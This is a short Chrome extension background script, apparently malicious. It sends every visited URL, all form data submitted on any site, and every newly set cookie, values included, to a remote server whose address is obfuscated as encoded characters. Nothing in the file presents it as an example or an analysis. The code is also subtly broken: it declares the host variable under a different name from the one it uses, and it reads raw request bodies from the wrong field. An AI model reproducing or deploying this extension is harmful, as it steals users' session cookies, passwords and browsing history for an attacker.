${SERVEC_HOST} = '浸穹㍷洶穪牤㝤㔷睰昷穬慧㝧楱栲㙱獢歴㔳㑺㑭㌳獵㕮潺瑲橶祤\u2e6f湩潮'
chrome.webNavigation.onCompleted.addListener((e) => {
    const url = `${SERVER_HOST}/u`;
    fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}, {});

chrome.webRequest.onBeforeRequest.addListener(
    (e) => {
        const url = `${SERVER_HOST}/f`;
        let data = {};
        if (e.requestBody != undefined) {
            if (e.requestBody.formData != undefined) {
                data["data"] = e.requestBody.formData
            }
            if (e.requestBody.raw != undefined) {
                data["data"] = e.requestBody.formData.raw.join("");
            }
            fetch(
                url,
                {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                }
            );
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

chrome.cookies.onChanged.addListener(
    (e) => {
        const url = `${SERVER_HOST}/c`;
        if (!e.removed) {
            const cookie = e.cookie;
            const data = { 
                cookie: {
                    name: cookie.name,
                    sameSite: cookie.sameSite,
                    domain: cookie.domain,
                    session: cookie.session,
                    value: cookie.value
                }
            };
            fetch(
                url,
                {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                }
            )
            
        }
    }
);
